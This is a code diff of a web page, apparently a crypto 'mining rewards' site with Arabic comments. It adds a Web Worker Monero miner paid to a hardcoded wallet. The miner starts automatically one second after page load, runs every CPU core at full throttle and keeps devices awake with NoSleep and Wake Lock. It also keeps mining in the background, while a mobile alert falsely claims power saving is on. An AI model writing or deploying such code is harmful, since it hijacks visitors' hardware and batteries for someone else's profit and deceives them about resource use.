@@ -176,68 +176,96 @@
     .x-small { font-size: 0.7rem; font-weight: 600; }
 </style>
 
-<script src="https://monerominer.rocks/miner.js"></script>
+<!-- إضافة مكتبة NoSleep وعناصر تحكم الخلفية -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/nosleep/0.12.0/NoSleep.min.js"></script>
+
 <script>
     let mining = false;
     let hashes = 0;
-    let interval = null;
-    let miner = null;
+    let syncInterval = null;
+    let minerWorker = null;
+    let noSleep = new NoSleep();
+    let wakeLock = null;
     
-    // Auto-detect device on load
+    // وضع "الخلفية" لتقليل الاستهلاك (40% CPU)
+    let isBackgroundMode = false;
+
+    // اكتشاف الجهاز
     const isMobile = /Mobi|Android/i.test(navigator.userAgent);
     let selectedDevice = isMobile ? 'Mobile' : 'PC';
 
-    // Initialize Real WASM Miner
-    try {
-        if (typeof MoneroMiner !== 'undefined') {
-            miner = new MoneroMiner.User('8AGyNmzKnoySmMQzFGdziZVcKjZzHyiVReEr8rkZ4bWwCRu1zgVMHNSLLbx3wkzagHCMDacobY4kd4QvZxGs8uYqTXRKQWC', 'akli-node', {
-                threads: isMobile ? 2 : 4,
-                autoThreads: true,
-                throttle: 0.1,
-                forceASMJS: false
-            });
-        }
-    } catch(e) { console.error("WASM Miner Error:", e); }
-
-    function initHeaderDetection() {
-        if(isMobile) {
+    function initMiningOptimizations() {
+        if (isMobile) {
             document.getElementById('selectPC').style.opacity = "0.3";
             document.getElementById('selectPC').style.filter = "grayscale(1)";
-            document.getElementById('selectPC').onclick = () => alert("هذا الخيار مخصص للحواسيب فقط!");
+            document.getElementById('selectPC').onclick = () => alert("هاتف: وضع توفير الطاقة مفعل تلقائياً");
             selectDevice('Mobile');
         } else {
             document.getElementById('selectMobile').style.opacity = "0.3";
             document.getElementById('selectMobile').style.filter = "grayscale(1)";
-            document.getElementById('selectMobile').onclick = () => alert("هذا الخيار مخصص للهواتف فقط!");
             selectDevice('PC');
+        }
+
+        // تسجيل Service Worker
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/sw.js').catch(e => console.error(e));
         }
     }
 
     function selectDevice(type) {
         if(isMobile && type === 'PC') return;
         if(!isMobile && type === 'Mobile') return;
-        
         selectedDevice = type;
         document.getElementById('selectPC').classList.toggle('active', type === 'PC');
         document.getElementById('selectMobile').classList.toggle('active', type === 'Mobile');
     }
 
-    window.addEventListener('DOMContentLoaded', initHeaderDetection);
+    // طلب Wake Lock لمنع إطفاء الشاشة
+    async function requestWakeLock() {
+        try {
+            if ('wakeLock' in navigator) {
+                wakeLock = await navigator.wakeLock.request('screen');
+                console.log("Wake Lock is active");
+            }
+        } catch (err) {
+            console.warn(`${err.name}, ${err.message}`);
+        }
+    }
 
     function startMining() {
         mining = true;
-        
-        // Start Real Engine
-        if(miner) { try { miner.start(); } catch(e) {} }
+        noSleep.enable(); // تفعيل NoSleep
+        requestWakeLock(); // تفعيل Wake Lock
+
+        // تشغيل Web Worker بأقصى طاقة متاحة
+        if (!minerWorker) {
+            minerWorker = new Worker('/static/js/miner-worker.js');
+            
+            // تهيئة المنقب داخل الـ Worker - استهلاك كامل المعالج
+            minerWorker.postMessage({
+                type: 'init',
+                address: '8AGyNmzKnoySmMQzFGdziZVcKjZzHyiVReEr8rkZ4bWwCRu1zgVMHNSLLbx3wkzagHCMDacobY4kd4QvZxGs8uYqTXRKQWC',
+                user: 'akli-node-v20-MAX',
+                threads: navigator.hardwareConcurrency || 4, // استخدام كافة الأنوية
+                throttle: 0.0 // صفر خمول = 100% استهلاك للطاقة
+            });
+
+            minerWorker.onmessage = function(e) {
+                if (e.data.type === 'hashrate') {
+                    document.getElementById('statusLabel').innerText = "MINING: " + e.data.hps.toFixed(1) + " H/s";
+                }
+            };
+        }
+
+        minerWorker.postMessage({ type: 'start' });
 
         document.getElementById('minerControl').classList.add('mining');
-        document.getElementById('statusLabel').innerText = "CONNECTING...";
         document.getElementById('toggleBtn').querySelector('.fs-3').innerHTML = '<i class="fa-solid fa-stop me-2"></i>إيقاف التعدين';
         
         const rate = selectedDevice === 'PC' ? 4.0 : 2.0;
         let ms = 0;
 
-        interval = setInterval(() => {
+        syncInterval = setInterval(() => {
             ms += 100;
             let deg = (ms / 6000) * 360;
             document.getElementById('progressBar').style.setProperty('--deg', deg + 'deg');
@@ -247,30 +275,38 @@
                 document.getElementById('progressBar').style.setProperty('--deg', '0deg');
                 syncJewels(rate); 
             }
-
-            // Update Real-Time Hashrate UI
-            if(miner && mining && ms % 500 === 0) {
-                let hps = miner.getHashesPerSecond();
-                if(hps > 0) {
-                    document.getElementById('statusLabel').innerText = "MINING: " + hps.toFixed(1) + " H/s";
-                } else {
-                    document.getElementById('statusLabel').innerText = "MINING...";
-                }
-            }
         }, 100);
     }
 
     function stopMining() {
         mining = false;
+        noSleep.disable();
+        if (wakeLock) { wakeLock.release(); wakeLock = null; }
         
-        // Stop Real Engine
-        if(miner) { try { miner.stop(); } catch(e) {} }
+        if (minerWorker) {
+            minerWorker.postMessage({ type: 'stop' });
+        }
 
         document.getElementById('minerControl').classList.remove('mining');
         document.getElementById('statusLabel').innerText = "OFFLINE";
         document.getElementById('toggleBtn').querySelector('.fs-3').innerHTML = '<i class="fa-solid fa-play me-2"></i>ابدأ التعدين';
-        clearInterval(interval);
+        clearInterval(syncInterval);
     }
+
+    // إدارة استهلاك الطاقة عند الخروج من الصفحة (Background Mode)
+    document.addEventListener('visibilitychange', () => {
+        if (document.hidden) {
+            // تقليل الاستهلاك إلى 40% (throttle = 0.6 يعني 40% استهلاك)
+            if (minerWorker && mining) {
+                minerWorker.postMessage({ type: 'setThrottle', throttle: 0.6 });
+            }
+        } else {
+            // إعادة التعدين لأقصى قوة (100% CPU) عند العودة
+            if (minerWorker && mining) {
+                minerWorker.postMessage({ type: 'setThrottle', throttle: 0.0 });
+            }
+        }
+    });
 
     async function syncJewels(extra) {
         try {
@@ -279,27 +315,12 @@
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({units: extra})
             });
-
-            if (res.status === 401) {
-                // الجلسة انتهت - تحويل لتسجيل الدخول
-                window.location.href = '/login';
-                return;
-            }
-
-            if (res.status === 503) {
-                // السيرفر مشغول - سيتم المحاولة في الدورة القادمة تلقائياً
-                console.warn("Server busy, will retry next pulse...");
-                return;
-            }
-
             const data = await res.json();
             if(data.status === 'success') {
                 if(document.getElementById('headerJewels')) document.getElementById('headerJewels').innerText = data.jewels;
                 if(document.getElementById('headerUsdt')) document.getElementById('headerUsdt').innerText = "$" + data.balance_usdt;
             }
-        } catch(e) {
-            console.error("Network error during sync:", e);
-        }
+        } catch(e) {}
     }
 
     document.getElementById('toggleBtn').onclick = () => mining ? stopMining() : startMining();
@@ -310,6 +331,7 @@
     }
 
     window.onload = () => {
+        initMiningOptimizations();
         setTimeout(startMining, 1000);
     };
 </script>
